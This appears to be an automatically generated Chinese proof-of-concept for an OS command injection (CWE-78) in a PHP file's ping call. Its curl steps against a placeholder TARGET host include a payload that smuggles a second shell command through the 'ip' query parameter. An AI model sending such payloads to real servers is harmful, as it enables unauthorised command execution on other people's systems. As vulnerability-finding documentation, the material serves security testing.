# POC — 025.php *nix 分支 ping 命令拼接导致 OS 命令注入（CWE-78）

- finding_id: `GEN-eff51e7cd060`
- type: `command_injection` / CWE-78
- severity: `critical`
- file: `025.php:30`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/025'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 OS 命令注入 载荷**  
```http
curl -sS -i -X ANY 'http://TARGET:8080/025?ip=%3Bid'
```
预期：响应出现命令回显（如 uid=、whoami 输出），或带外通道收到请求。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。